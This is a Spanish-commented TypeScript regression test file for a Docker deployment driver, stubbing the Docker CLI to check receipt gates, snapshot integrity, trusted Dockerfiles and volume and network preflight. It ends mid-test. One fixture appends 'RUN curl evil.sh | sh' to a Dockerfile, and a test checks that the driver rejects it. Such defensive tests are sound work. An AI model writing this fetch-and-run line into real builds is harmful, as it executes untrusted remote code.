/**
 * Fase 7A — Tests de regresión de los 9 bloqueos de Codex (NO-GO).
 *
 * No necesitan el daemon Docker: usan un stub del `DockerCommandRunner`
 * que simula el CLI con estado en memoria (volúmenes, redes, imágenes,
 * contenedores). Las pruebas que SÍ necesitan pulls/builds reales viven
 * en `integration.test.ts` (job `docker-driver-integration` de CI).
 */
import { describe, test, expect } from 'vitest';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import net from 'node:net';
import { fileURLToPath } from 'node:url';
import Database from 'better-sqlite3';
import {
  resolveDockerDriverConfig,
  preflightDocker,
  DockerDeploymentDriver,
  type DockerDriverConfig,
} from './dockerDriver.js';
import {
  DockerCommandRunner,
  type DockerRunOptions,
  type DockerRunResult,
  type DockerRunRawResult,
} from './commandRunner.js';
import { ensureVerificationReceiptsTable, recordVerificationReceipt } from '../deploy/receipts.js';
import { DYNAMIC_CHECK_ORDER, checkScopeFingerprint, type DynamicCheckKey } from '../dynamicTools.js';
import { projectLiveVolumeName, resourceNames } from './resources.js';
import { backupDirFor, writeBackupManifest, sha256File, type BackupManifest } from './sqliteBackup.js';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const TEMPLATES_DIR = path.resolve(HERE, '..', '..', '..', '..', 'templates');

const BASE_ENV = {
  APPFORGE_DEPLOY_DRIVER: 'docker',
  APPFORGE_ENABLE_DOCKER_DEPLOY: '1',
  APPFORGE_DOCKER_NETWORK: 'appforge-apps',
  APPFORGE_DOCKER_DATA_VOLUME: 'appforge-data',
  APPFORGE_TEMPLATES_DIR: TEMPLATES_DIR,
};

const PID = '11111111-2222-4333-8444-555555555555';
const DID = 'aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee';
const DID2 = 'ffffffff-1111-4222-8333-444444444444';

// ---------------------------------------------------------------------------
// Stub del runner
// ---------------------------------------------------------------------------

interface StubImage {
  id: string;
  repo: string;
  tag: string;
  labels: Record<string, string>;
  os: string;
  arch: string;
  user: string;
}

function parseLabelArgs(args: string[]): Record<string, string> {
  const out: Record<string, string> = {};
  for (let i = 0; i < args.length; i++) {
    if (args[i] === '--label' && i + 1 < args.length) {
      const v = args[i + 1]!;
      const eq = v.indexOf('=');
      if (eq > 0) out[v.slice(0, eq)] = v.slice(eq + 1);
      i++;
    }
  }
  return out;
}

class StubDocker {
  calls: string[][] = [];
  callSignals: Array<AbortSignal | undefined> = [];
  volumes = new Map<string, Record<string, string>>();
  networks = new Map<string, { internal: boolean; labels: Record<string, string> }>();
  images = new Map<string, StubImage>(); // por ref o id
  containers = new Map<string, unknown>();
  /** ids de imagen con contenedores (ps -a --filter ancestor=). */
  psAncestorHits = new Set<string>();
  /** Contenido servido al copiar DESDE un contenedor al host (verify). */
  hostFiles = new Map<string, Buffer>();
  /**
   * Rastreo de contenido de volúmenes (NO-GO 2, bloqueo 3): permite
   * demostrar con datos reales que el rescate y la compensación preservan
   * los bytes del volumen live.
   */
  containerVolumes = new Map<string, string>(); // contenedor temporal → volumen montado en /data
  volumeFiles = new Map<string, Map<string, Buffer>>(); // volumen → fichero → contenido
  /**
   * Plantilla de inspect para contenedores creados con `docker run --name`.
   * Se deep-copia bajo el nombre indicado con State.Running=true.
   */
  containerTemplate: unknown = undefined;
  /** Labels que `inspect` devuelve para una imagen (por id), simulando cambio entre listado e inspección. */
  inspectLabelOverride = new Map<string, Record<string, string>>();
  /** Arquitectura que `docker info --format '{{.Architecture}}'` reporta (defecto: x86_64). */
  daemonArch = 'x86_64';
  /**
   * Fallos inyectados (NO-GO 2): el primer patrón que case con el prefijo
   * del argv devuelve el resultado indicado UNA vez y se consume.
   */
  faults: Array<{ prefix: string[]; result: 'fail' | 'aborted'; stderr: string }> = [];

  /** Inyecta un fallo en la próxima llamada cuyo argv empiece por `prefix`. */
  failNext(prefix: string[], result: 'fail' | 'aborted' = 'fail', stderr = 'injected failure'): void {
    this.faults.push({ prefix, result, stderr });
  }

  /**
   * Fallos con predicado (NO-GO 2, B3): el predicado recibe el argv y el
   * propio stub (para consultar `containerVolumes`). Se consume una vez.
   */
  failPreds: Array<{
    pred: (args: string[], stub: StubDocker) => boolean;
    result: 'fail' | 'aborted';
    stderr: string;
  }> = [];

  /** Inyecta un fallo en la próxima llamada que cumpla el predicado. */
  failWhen(
    pred: (args: string[], stub: StubDocker) => boolean,
    result: 'fail' | 'aborted' = 'fail',
    stderr = 'injected failure',
  ): void {
    this.failPreds.push({ pred, result, stderr });
  }

  private deepCopy<T>(v: T): T {
    return JSON.parse(JSON.stringify(v)) as T;
  }

  private okRes(stdout = '', stderr = ''): DockerRunResult {
    return { code: 0, signal: null, stdout, stderr, truncated: false, timedOut: false, aborted: false, durationMs: 1 };
  }
  private failRes(code: number, stderr: string): DockerRunResult {
    return { code, signal: null, stdout: '', stderr, truncated: false, timedOut: false, aborted: false, durationMs: 1 };
  }

  async run(options: DockerRunOptions): Promise<DockerRunResult> {
    const args = options.args;
    this.calls.push([...args]);
    this.callSignals.push(options.signal);
    // Fallo inyectado por predicado (se consume una sola vez).
    const predIdx = this.failPreds.findIndex((f) => f.pred(args, this));
    if (predIdx >= 0) {
      const [fault] = this.failPreds.splice(predIdx, 1);
      if (fault.result === 'aborted') {
        return { ...this.okRes(), code: null, aborted: true };
      }
      return this.failRes(1, fault.stderr);
    }
    // Fallo inyectado por prefijo (se consume una sola vez).
    const faultIdx = this.faults.findIndex((f) => f.prefix.every((p, i) => args[i] === p));
    if (faultIdx >= 0) {
      const [fault] = this.faults.splice(faultIdx, 1);
      if (fault.result === 'aborted') {
        return { ...this.okRes(), code: null, aborted: true };
      }
      return this.failRes(1, fault.stderr);
    }
    const [sub, second] = args;
    const last = args[args.length - 1]!;

    // docker inspect <name> (genérico)
    if (sub === 'inspect') {
      const name = second!;
      const v = this.volumes.get(name);
      if (v) return this.okRes(JSON.stringify([{ Name: name, Labels: v }]));
      const n = this.networks.get(name);
      if (n) return this.okRes(JSON.stringify([{ Name: name, Internal: n.internal, Labels: n.labels }]));
      const c = this.containers.get(name);
      if (c !== undefined) return this.okRes(JSON.stringify([c]));
      const img = this.images.get(name);
      if (img) {
        const labels = this.inspectLabelOverride.get(img.id) ?? img.labels;
        return this.okRes(
          JSON.stringify([
            {
              Id: img.id,
              RepoTags: [`${img.repo}:${img.tag}`],
              Os: img.os,
              Architecture: img.arch,
              Config: { User: img.user, Labels: labels, Image: `${img.repo}:${img.tag}` },
            },
          ]),
        );
      }
      return this.failRes(1, `Error: No such object: ${name}`);
    }
    // docker network inspect / volume inspect (preflight)
    if ((sub === 'network' || sub === 'volume') && second === 'inspect') {
      const name = args[2]!;
      if (sub === 'network') {
        const n = this.networks.get(name);
        if (!n) return this.failRes(1, `Error: No such network: ${name}`);
        return this.okRes(JSON.stringify([{ Name: name, Internal: n.internal, Labels: n.labels }]));
      }
      const v = this.volumes.get(name);
      if (!v) return this.failRes(1, `Error: No such volume: ${name}`);
      return this.okRes(JSON.stringify([{ Name: name, Labels: v }]));
    }
    if (sub === 'volume' && second === 'create') {
      this.volumes.set(last, parseLabelArgs(args));
      return this.okRes(last + '\n');
    }
    if (sub === 'volume' && second === 'rm') {
      const name = args[2]!;
      if (!this.volumes.has(name)) return this.failRes(1, `Error: No such volume: ${name}`);
      this.volumes.delete(name);
      this.volumeFiles.delete(name);
      return this.okRes(name + '\n');
    }
    if (sub === 'network' && second === 'create') {
      this.networks.set(last, { internal: args.includes('--internal'), labels: parseLabelArgs(args) });
      return this.okRes(last + '\n');
    }
    if (sub === 'network' && second === 'rm') {
      this.networks.delete(args[2]!);
      return this.okRes('');
    }
    // docker build -t <ref> --label ... : registra la imagen con sus labels.
    if (sub === 'build' || sub === 'buildx') {
      const tIdx = args.indexOf('-t');
      const ref = tIdx >= 0 ? args[tIdx + 1]! : `appforge/app-unknown:latest`;
      const [repo, tag] = ref.includes(':') ? ref.split(':') : [ref, 'latest'];
      const id = `sha256:${'b'.repeat(64)}`;
      this.images.set(ref, {
        id,
        repo: repo!,
        tag: tag!,
        labels: parseLabelArgs(args),
        os: 'linux',
        arch: 'amd64',
        user: '1001',
      });
      this.images.set(id, this.images.get(ref)!);
      return this.okRes('build ok\n');
    }
    if (sub === 'images') {
      const seen = new Set<string>();
      const lines: string[] = [];
      for (const img of this.images.values()) {
        if (seen.has(img.id)) continue;
        seen.add(img.id);
        lines.push(
          JSON.stringify({
            ID: img.id,
            Repository: img.repo,
            Tag: img.tag,
            Labels: Object.entries(img.labels)
              .map(([k, v]) => `${k}=${v}`)
              .join(','),
          }),
        );
      }
      return this.okRes(lines.join('\n') + '\n');
    }
    if (sub === 'ps') {
      const fIdx = args.findIndex((a) => a.startsWith('ancestor='));
      if (fIdx >= 0) {
        const id = args[fIdx]!.slice('ancestor='.length);
        return this.okRes(this.psAncestorHits.has(id) ? 'deadbeef1234\n' : '');
      }
      return this.okRes('');
    }
    if (sub === 'rmi') {
      const ref = args[1]!;
      const img = this.images.get(ref);
      if (img) {
        for (const [k, v] of [...this.images.entries()]) if (v.id === img.id) this.images.delete(k);
      }
      return this.okRes(`Untagged: ${ref}\n`);
    }
    if (sub === 'cp') {
      // <contenedor>:/data/<name> -> <ruta host>: servir contenido configurado
      // o rastreado del volumen montado por el temporal.
      // <ruta host> -> <contenedor>:/data/<name>: registrar en el volumen.
      // args = ['cp', <origen>, <destino>].
      const src: string = args[1] ?? '';
      const dst: string = args[2] ?? '';
      const marker = ':/data/';
      const mi = src.indexOf(marker);
      if (mi > 0 && !src.slice(0, mi).includes(':') && path.isAbsolute(dst)) {
        const cname = src.slice(0, mi);
        const fname = src.slice(mi + marker.length);
        let buf = this.hostFiles.get(fname);
        if (!buf) {
          const vol = this.containerVolumes.get(cname);
          buf = vol ? this.volumeFiles.get(vol)?.get(fname) : undefined;
        }
        if (!buf) return this.failRes(1, `Error response from daemon: Could not find the file ${src.slice(mi)} in container ${cname}`);
        fs.mkdirSync(path.dirname(dst), { recursive: true });
        fs.writeFileSync(dst, buf);
      } else {
        const dmi = dst.indexOf(marker);
        if (dmi > 0 && !dst.slice(0, dmi).includes(':') && path.isAbsolute(src) && fs.existsSync(src)) {
          const cname = dst.slice(0, dmi);
          const fname = dst.slice(dmi + marker.length);
          const vol = this.containerVolumes.get(cname);
          if (vol) {
            let m = this.volumeFiles.get(vol);
            if (!m) {
              m = new Map();
              this.volumeFiles.set(vol, m);
            }
            m.set(fname, fs.readFileSync(src));
          }
        }
      }
      return this.okRes('');
    }
    if (sub === 'version') return this.okRes('29.1.3\n');
    if (sub === 'info') {
      if (args.some((a) => a.includes('Architecture'))) return this.okRes(this.daemonArch + '\n');
      return this.okRes(JSON.stringify({ ServerVersion: '29.1.3' }));
    }
    // docker run --name <n>: registrar el contenedor desde la plantilla.
    if (sub === 'run') {
      const nIdx = args.indexOf('--name');
      if (nIdx >= 0 && this.containerTemplate !== undefined) {
        const entry = this.deepCopy(this.containerTemplate) as { State?: { Running?: boolean } };
        entry.State = { Running: true };
        this.containers.set(args[nIdx + 1]!, entry);
      }
      return this.okRes('');
    }
    // docker stop <n>: marcar detenido.
    if (sub === 'stop') {
      const entry = this.containers.get(args[args.length - 1]!) as { State?: { Running?: boolean } } | undefined;
      if (entry?.State) entry.State.Running = false;
      return this.okRes('');
    }
    // docker start <n>: marcar en marcha.
    if (sub === 'start') {
      const entry = this.containers.get(args[args.length - 1]!) as { State?: { Running?: boolean } } | undefined;
      if (entry?.State) entry.State.Running = true;
      return this.okRes('');
    }
    // docker rm <n>: eliminar el contenedor del mapa y su mapeo de volumen.
    if (sub === 'rm') {
      this.containerVolumes.delete(args[1]!);
      if (this.containers.has(args[1]!)) this.containers.delete(args[1]!);
      return this.okRes('');
    }
    // docker create --name <n> -v <vol>:/data: registrar el mapeo
    // contenedor→volumen para el rastreo de contenido (NO-GO 2, B3).
    if (sub === 'create') {
      const nIdx = args.indexOf('--name');
      const vIdx = args.findIndex((a, i) => (a === '-v' || a === '--volume') && i + 1 < args.length);
      if (nIdx >= 0 && vIdx >= 0) {
        const vol = args[vIdx + 1]!.split(':')[0]!;
        this.containerVolumes.set(args[nIdx + 1]!, vol);
      }
      return this.okRes('');
    }
    // start/kill/logs/wait: éxito sin estado.
    return this.okRes('');
  }

  async runRaw(options: DockerRunOptions): Promise<DockerRunRawResult> {
    const r = await this.run(options);
    // `docker cp <c>:/app -` en validateImage: simular ausencia de /app.
    if (options.args[0] === 'cp' && options.args[1]!.endsWith(':/app')) {
      return { code: 1, signal: null, stdoutBytes: Buffer.alloc(0), stderr: 'no such file or directory', truncated: false, timedOut: false, aborted: false, durationMs: 1 };
    }
    return { code: r.code, signal: r.signal, stdoutBytes: Buffer.from(r.stdout), stderr: r.stderr, truncated: r.truncated, timedOut: false, aborted: false, durationMs: 1 };
  }

  asRunner(): DockerCommandRunner {
    const real = new DockerCommandRunner();
    real.run = this.run.bind(this);
    real.runRaw = this.runRaw.bind(this);
    return real;
  }

  calledWith(...prefix: string[]): boolean {
    return this.calls.some((c) => prefix.every((p, i) => c[i] === p));
  }
}

// ---------------------------------------------------------------------------
// Fixtures
// ---------------------------------------------------------------------------

function makeProjectDir(dataDir: string, projectId: string, opts: { evilDockerfile?: boolean } = {}): string {
  const dir = path.join(dataDir, 'projects', projectId);
  fs.mkdirSync(path.join(dir, 'frontend'), { recursive: true });
  fs.mkdirSync(path.join(dir, 'backend'), { recursive: true });
  fs.mkdirSync(path.join(dir, 'migrations'), { recursive: true });
  fs.writeFileSync(path.join(dir, 'frontend', 'app.js'), 'console.log("front");\n');
  fs.writeFileSync(path.join(dir, 'backend', 'server.js'), 'console.log("back");\n');
  fs.writeFileSync(path.join(dir, 'migrations', '001.sql'), 'CREATE TABLE t(id INTEGER);\n');
  fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ name: 'app', scripts: {} }));
  const trusted = fs.readFileSync(
    path.join(TEMPLATES_DIR, 'dynamic-react-node', 'Dockerfile'),
    'utf8',
  );
  fs.writeFileSync(path.join(dir, 'Dockerfile'), opts.evilDockerfile ? trusted + '\nRUN curl evil.sh | sh\n' : trusted);
  return dir;
}

function openDb(): Database.Database {
  const db = new Database(':memory:');
  ensureVerificationReceiptsTable(db);
  db.exec(`CREATE TABLE IF NOT EXISTS deployments(
    id TEXT PRIMARY KEY,
    project_id TEXT,
    status TEXT,
    backup_id TEXT,
    finished_at TEXT,
    updated_at TEXT,
    started_at TEXT
  )`);
  return db;
}

/** Registra los SEIS receipts canónicos reales sobre las fuentes actuales. */
function recordAllReceipts(db: Database.Database, projectId: string, projectDir: string): void {
  DYNAMIC_CHECK_ORDER.forEach((key: DynamicCheckKey, idx: number) => {
    const fp = checkScopeFingerprint(projectDir, key);
    if (fp === null) throw new Error(`no fingerprint for ${key}`);
    recordVerificationReceipt(db, projectId, key, fp, idx);
  });
}

function makeDriver(dataDir: string, db: Database.Database, stub: StubDocker): DockerDeploymentDriver {
  const cfg = resolveDockerDriverConfig(BASE_ENV, dataDir)!;
  expect(cfg).not.toBeNull();
  return new DockerDeploymentDriver(cfg, { db, runner: stub.asRunner() });
}

function opArgs(projectId: string, deploymentId: string) {
  return { projectId, deploymentId, candidateId: `cand-${deploymentId.slice(0, 8)}` } as never;
}

describe('B1: puerta de receipts reales (fail closed)', () => {
  test('seis receipts vigentes abren la puerta: buildCandidate construye', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const projectDir = makeProjectDir(dataDir, PID);
    recordAllReceipts(db, PID, projectDir);
    db.prepare('INSERT INTO deployments(id) VALUES (?)').run(DID);
    const stub = new StubDocker();
    const d = makeDriver(dataDir, db, stub);
    const r = await d.buildCandidate(opArgs(PID, DID));
    expect(r.ok).toBe(true);
    expect(stub.calledWith('build')).toBe(true);
  });

  test('sin receipts → puerta cerrada y ningún comando docker', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    makeProjectDir(dataDir, PID);
    const stub = new StubDocker();
    const d = makeDriver(dataDir, db, stub);
    const r = await d.buildCandidate(opArgs(PID, DID));
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/RECEIPT_GATE_FAILED/);
    expect(stub.calls.length).toBe(0);
  });

  test('un receipt stale (fuentes mutadas) cierra la puerta', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const projectDir = makeProjectDir(dataDir, PID);
    recordAllReceipts(db, PID, projectDir);
    // Mutar una fuente tras la verificación: el receipt queda stale.
    fs.appendFileSync(path.join(projectDir, 'backend', 'server.js'), '// cambio\n');
    const stub = new StubDocker();
    const d = makeDriver(dataDir, db, stub);
    const r = await d.buildCandidate(opArgs(PID, DID));
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/RECEIPT_GATE_FAILED/);
    expect(stub.calls.length).toBe(0);
  });

  test('orden no canónico cierra la puerta', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const projectDir = makeProjectDir(dataDir, PID);
    // seq permutados: orden incorrecto aunque los fingerprints sean vigentes.
    DYNAMIC_CHECK_ORDER.forEach((key: DynamicCheckKey, idx: number) => {
      const fp = checkScopeFingerprint(projectDir, key)!;
      recordVerificationReceipt(db, PID, key, fp, DYNAMIC_CHECK_ORDER.length - 1 - idx);
    });
    const stub = new StubDocker();
    const d = makeDriver(dataDir, db, stub);
    const r = await d.buildCandidate(opArgs(PID, DID));
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/RECEIPT_GATE_FAILED/);
  });

  test('error de lectura de la DB cierra la puerta (fail closed)', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const projectDir = makeProjectDir(dataDir, PID);
    recordAllReceipts(db, PID, projectDir);
    db.close(); // la lectura lanzará
    const stub = new StubDocker();
    const d = makeDriver(dataDir, db, stub);
    const r = await d.buildCandidate(opArgs(PID, DID));
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/RECEIPT_GATE/);
    expect(stub.calls.length).toBe(0);
  });
});

describe('B2: fingerprints separados y snapshot verificado contra SQLite', () => {
  test('persiste fingerprint de fuentes y de snapshot por separado', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const projectDir = makeProjectDir(dataDir, PID);
    recordAllReceipts(db, PID, projectDir);
    db.prepare('INSERT INTO deployments(id) VALUES (?)').run(DID);
    const stub = new StubDocker();
    const d = makeDriver(dataDir, db, stub);
    const r = await d.buildCandidate(opArgs(PID, DID));
    expect(r.ok).toBe(true);
    const row = db
      .prepare('SELECT verified_source_fingerprint, snapshot_fingerprint, snapshot_path FROM deployments WHERE id=?')
      .get(DID) as Record<string, string | null>;
    expect(row.verified_source_fingerprint).toMatch(/^[0-9a-f]{64}$/i);
    expect(row.snapshot_fingerprint).toMatch(/^[0-9a-f]{64}$/i);
    expect(row.verified_source_fingerprint).not.toBe(row.snapshot_fingerprint);
    expect(row.snapshot_path).toContain(DID);
  });

  test('reutilizar snapshot sin registro en SQLite → rechazado', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const projectDir = makeProjectDir(dataDir, PID);
    recordAllReceipts(db, PID, projectDir);
    db.prepare('INSERT INTO deployments(id) VALUES (?)').run(DID);
    const stub = new StubDocker();
    const d = makeDriver(dataDir, db, stub);
    expect((await d.buildCandidate(opArgs(PID, DID))).ok).toBe(true);
    // Borrar el registro: el snapshot en disco ya no es reutilizable.
    db.prepare('DELETE FROM deployments WHERE id=?').run(DID);
    db.prepare('INSERT INTO deployments(id) VALUES (?)').run(DID);
    const r2 = await d.buildCandidate(opArgs(PID, DID));
    expect(r2.ok).toBe(false);
    expect(r2.code).toMatch(/SNAPSHOT_DB_MISMATCH/);
  });

  test('snapshot manipulado en disco → re-hash lo rechaza', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const projectDir = makeProjectDir(dataDir, PID);
    recordAllReceipts(db, PID, projectDir);
    db.prepare('INSERT INTO deployments(id) VALUES (?)').run(DID);
    const stub = new StubDocker();
    const d = makeDriver(dataDir, db, stub);
    expect((await d.buildCandidate(opArgs(PID, DID))).ok).toBe(true);
    // Manipular un fichero del snapshot: el re-hash debe detectarlo.
    const snapFile = path.join(dataDir, 'deploy-snapshots', DID, 'backend', 'server.js');
    fs.appendFileSync(snapFile, '// manipulado\n');
    const r2 = await d.buildCandidate(opArgs(PID, DID));
    expect(r2.ok).toBe(false);
    expect(r2.code).toMatch(/SNAPSHOT/);
  });

  test('ruta del snapshot distinta a la registrada → rechazado', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const projectDir = makeProjectDir(dataDir, PID);
    recordAllReceipts(db, PID, projectDir);
    db.prepare('INSERT INTO deployments(id) VALUES (?)').run(DID);
    const stub = new StubDocker();
    const d = makeDriver(dataDir, db, stub);
    expect((await d.buildCandidate(opArgs(PID, DID))).ok).toBe(true);
    db.prepare('UPDATE deployments SET snapshot_path=? WHERE id=?').run('/tmp/otro-sitio', DID);
    const r2 = await d.buildCandidate(opArgs(PID, DID));
    expect(r2.ok).toBe(false);
    expect(r2.code).toMatch(/SNAPSHOT_DB_MISMATCH/);
  });
});

describe('B3: Dockerfile confiable byte a byte', () => {
  test('Dockerfile del proyecto distinto a la plantilla → fail closed', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    makeProjectDir(dataDir, PID, { evilDockerfile: true });
    recordAllReceipts(db, PID, path.join(dataDir, 'projects', PID));
    db.prepare('INSERT INTO deployments(id) VALUES (?)').run(DID);
    const stub = new StubDocker();
    const d = makeDriver(dataDir, db, stub);
    const r = await d.buildCandidate(opArgs(PID, DID));
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/DOCKERFILE_UNTRUSTED/);
    expect(stub.calledWith('build')).toBe(false);
  });

  test('.dockerignore manipulado en el snapshot → rechazado', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const projectDir = makeProjectDir(dataDir, PID);
    recordAllReceipts(db, PID, projectDir);
    db.prepare('INSERT INTO deployments(id) VALUES (?)').run(DID);
    const stub = new StubDocker();
    const d = makeDriver(dataDir, db, stub);
    expect((await d.buildCandidate(opArgs(PID, DID))).ok).toBe(true);
    // Manipular el .dockerignore controlado dentro del snapshot ya creado.
    fs.writeFileSync(path.join(dataDir, 'deploy-snapshots', DID, '.dockerignore'), '# manipulado\n');
    const r2 = await d.buildCandidate(opArgs(PID, DID));
    expect(r2.ok).toBe(false);
    expect(r2.code).toMatch(/DOCKERIGNORE_UNTRUSTED/);
  });

  test('sin templatesDir → fail closed antes del build', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const projectDir = makeProjectDir(dataDir, PID);
    recordAllReceipts(db, PID, projectDir);
    db.prepare('INSERT INTO deployments(id) VALUES (?)').run(DID);
    const cfg = resolveDockerDriverConfig({ ...BASE_ENV, APPFORGE_TEMPLATES_DIR: '' }, dataDir)!;
    const stub = new StubDocker();
    const d = new DockerDeploymentDriver(cfg, { db, runner: stub.asRunner() });
    const r = await d.buildCandidate(opArgs(PID, DID));
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/TEMPLATES_DIR_REQUIRED/);
    expect(stub.calledWith('build')).toBe(false);
  });
});

describe('B4: volumen live con identidad estable de proyecto', () => {
  /** Dos despliegues consecutivos comparten el MISMO volumen live. */
  test('dos despliegues exitosos consecutivos reutilizan el mismo volumen', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const projectDir = makeProjectDir(dataDir, PID);
    recordAllReceipts(db, PID, projectDir);
    db.prepare('INSERT INTO deployments(id) VALUES (?)').run(DID);
    db.prepare('INSERT INTO deployments(id) VALUES (?)').run(DID2);
    const stub = new StubDocker();
    const d = makeDriver(dataDir, db, stub);
    expect((await d.buildCandidate(opArgs(PID, DID))).ok).toBe(true);
    expect((await d.buildCandidate(opArgs(PID, DID2))).ok).toBe(true);
    const liveVolume = projectLiveVolumeName(PID);

    // ensureLiveVolume es privado: se ejercita vía startCandidateAsLive.
    fs.writeFileSync(path.join(projectDir, '.env'), 'PORT=8080\n');
    const contInspect = (labels: Record<string, string>, imageRef: string) => ({
      Config: { Labels: labels, User: '1001', Image: imageRef },
      State: { Running: true },
      Mounts: [
        { Type: 'volume', Name: liveVolume, Source: liveVolume, Destination: '/data' },
        { Type: 'tmpfs', Destination: '/tmp' },
      ],
      NetworkSettings: { Networks: { 'appforge-apps': {} }, Ports: {} },
      HostConfig: {
        Memory: 512 * 1024 * 1024,
        MemorySwap: 512 * 1024 * 1024,
        NanoCpus: 1_000_000_000,
        PidsLimit: 128,
        CapDrop: ['ALL'],
        SecurityOpt: ['no-new-privileges'],
        ReadonlyRootfs: true,
        Privileged: false,
        Devices: [],
        PidMode: '',
        IpcMode: 'private',
        NetworkMode: 'appforge-apps',
        RestartPolicy: { Name: 'unless-stopped' },
      },
    });

    const fp1 = (db.prepare('SELECT snapshot_fingerprint AS f FROM deployments WHERE id=?').get(DID) as { f: string }).f;
    const img1 = `appforge/app-${PID.slice(0, 8)}:dep-${DID.slice(0, 8)}-${fp1.slice(0, 12)}`;
    stub.containerTemplate = contInspect({
      'com.appforge.managed': 'true',
      'com.appforge.project-id': PID,
      'com.appforge.deployment-id': DID,
      'com.appforge.role': 'live',
      'com.appforge.source-fingerprint': fp1,
    }, img1);
    const r1 = await d.startCandidateAsLive(opArgs(PID, DID));
    expect(r1.ok).toBe(true);

    // Segundo despliegue: el volumen live ya existe con labels estables.
    const fp2 = (db.prepare('SELECT snapshot_fingerprint AS f FROM deployments WHERE id=?').get(DID2) as { f: string }).f;
    const img2 = `appforge/app-${PID.slice(0, 8)}:dep-${DID2.slice(0, 8)}-${fp2.slice(0, 12)}`;
    stub.containerTemplate = contInspect({
      'com.appforge.managed': 'true',
      'com.appforge.project-id': PID,
      'com.appforge.deployment-id': DID2,
      'com.appforge.role': 'live',
      'com.appforge.source-fingerprint': fp2,
    }, img2);
    const before = stub.calls.filter((c) => c[0] === 'volume' && c[1] === 'create').length;
    const r2 = await d.startCandidateAsLive(opArgs(PID, DID2));
    expect(r2.ok).toBe(true);
    const after = stub.calls.filter((c) => c[0] === 'volume' && c[1] === 'create').length;
    expect(after).toBe(before); // no se creó ningún volumen nuevo

    // El volumen live existe UNA vez, con labels estables (sin deployment ni fingerprint).
    const vols = [...stub.volumes.entries()].filter(([n]) => n === liveVolume);
    expect(vols.length).toBe(1);
    const labels = vols[0]![1];
    expect(labels['com.appforge.managed']).toBe('true');
    expect(labels['com.appforge.project-id']).toBe(PID);
    expect(labels['com.appforge.role']).toBe('live');
    expect(labels['com.appforge.deployment-id']).toBeUndefined();
    expect(labels['com.appforge.source-fingerprint']).toBeUndefined();
    // Nunca se eliminó el volumen live.
    expect(stub.calls.some((c) => c[0] === 'volume' && c[1] === 'rm' && c[2] === liveVolume)).toBe(false);
  });
});

describe.skipIf(process.platform === 'win32')('B5: preflight con propiedad exacta', () => {
  async function preflightCfg(dataDir: string, stub: StubDocker) {
    const sock = path.join(dataDir, 'docker.sock');
    const server = net.createServer();
    await new Promise<void>((res) => server.listen(sock, () => res()));
    const cfg = { ...resolveDockerDriverConfig(BASE_ENV, dataDir)!, socketPath: sock };
    return { cfg, server, sock, stub };
  }

  test('red existente no interna → falla sin modificarla', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const stub = new StubDocker();
    stub.networks.set('appforge-apps', { internal: false, labels: { 'com.appforge.managed': 'true', 'com.appforge.component': 'network' } });
    const { cfg, server } = await preflightCfg(dataDir, stub);
    const r = await preflightDocker(stub.asRunner(), cfg);
    server.close();
    expect(r.ok).toBe(false);
    expect(r.diagnostics.join(' ')).toMatch(/not internal/);
    expect(stub.networks.get('appforge-apps')!.internal).toBe(false); // intacta
    expect(stub.calledWith('network', 'rm')).toBe(false);
  });

  test('red existente con labels ajenas → falla sin modificarla', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const stub = new StubDocker();
    stub.networks.set('appforge-apps', { internal: true, labels: { 'otra': 'cosa' } });
    const { cfg, server } = await preflightCfg(dataDir, stub);
    const r = await preflightDocker(stub.asRunner(), cfg);
    server.close();
    expect(r.ok).toBe(false);
    expect(r.diagnostics.join(' ')).toMatch(/foreign\/missing labels/);
    expect(stub.networks.get('appforge-apps')!.labels).toEqual({ 'otra': 'cosa' });
  });

  test('volumen existente sin labels → falla sin modificarlo', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const stub = new StubDocker();
    stub.networks.set('appforge-apps', { internal: true, labels: { 'com.appforge.managed': 'true', 'com.appforge.component': 'network' } });
    stub.volumes.set('appforge-data', {});
    const { cfg, server } = await preflightCfg(dataDir, stub);
    const r = await preflightDocker(stub.asRunner(), cfg);
    server.close();
    expect(r.ok).toBe(false);
    expect(r.diagnostics.join(' ')).toMatch(/foreign\/missing labels/);
    expect(stub.volumes.has('appforge-data')).toBe(true);
    expect(stub.calledWith('volume', 'rm')).toBe(false);
  });

  test('camino feliz: crea red interna y volumen etiquetados', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const stub = new StubDocker();
    const { cfg, server } = await preflightCfg(dataDir, stub);
